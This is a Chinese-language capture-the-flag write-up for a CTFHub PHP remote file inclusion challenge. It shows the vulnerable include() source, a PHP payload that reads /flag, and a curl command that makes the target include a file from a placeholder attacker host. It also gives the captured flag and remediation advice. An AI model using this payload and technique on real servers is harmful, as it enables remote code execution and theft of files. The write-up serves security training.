CTFHub - Web - 远程包含

# CTFHub # Web # 远程包含 # RFI # PHP

一、题目信息

  • 题目名称：远程包含
  • 题目方向：Web - 文件包含
  • 运行环境：PHP 5.6.40
  • 题目目标：利用服务端开启的远程文件包含能力，执行攻击者控制的 PHP 代码并读取 /flag。

二、漏洞分析

题目首页通过 highlight_file(__FILE__) 暴露了后端源码：

<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>

参数 file 被直接传入 include()，用户可以控制包含目标。题目首页同时提供 /phpinfo.php，其中关键配置如下：

  • allow_url_fopen = On：允许通过 URL 打开远程资源。
  • allow_url_include = On：允许 include() 包含远程 URL。
  • open_basedir 未设置：PHP 可以读取根目录下的 Flag 文件。

因此，只要远程地址本身不包含字符串 flag，就可以把攻击者服务器上的文本作为 PHP 文件包含并执行。远程文件的扩展名和 Content-Type 不影响 PHP 解析，关键是响应体内容能被 include() 读取。

三、解题步骤

  1. 确认远程包含开关：访问 /phpinfo.php，搜索 allow_url_include，确认值为 On。
  2. 准备远程 Payload：在攻击者可控的 HTTP 服务或临时文本托管服务中写入 rfi.txt。 
    <?php echo file_get_contents('/flag'); ?>

    Payload 不需要 .php 后缀；例如可将其原样托管为 http://<attacker-host>/rfi.txt。

  3. 触发远程包含：将远程 Payload 地址传给 file 参数。 
    curl.exe -sS --get ^
  --data-urlencode "file=http://<attacker-host>/rfi.txt" ^
  "http://<challenge-host>:10800/"

    目标服务器请求远程文件后，include() 会执行其中的 PHP 代码，并把 /flag 的内容写入响应。

    ctfhub{85b419387ae8cb9765cf7f3a}

四、最终 Flag

ctfhub{85b419387ae8cb9765cf7f3a}

五、修复建议

  • 关闭远程包含：生产环境必须设置 allow_url_include=Off，并确认 allow_url_fopen 按业务最小化开启。
  • 禁止用户控制包含目标：使用固定白名单映射，不直接接收或拼接文件路径。
  • 限制协议与路径：拒绝 http://、https://、data://、php://、phar:// 等可被滥用的包装器。
  • 最小权限：限制 Web 进程读取敏感文件的能力，并将 Flag 等敏感数据移出 Web 服务可读取范围。
  • 收敛调试信息：不要在生产环境暴露 PHPINFO 页面，也不要通过 highlight_file() 回显后端源码。
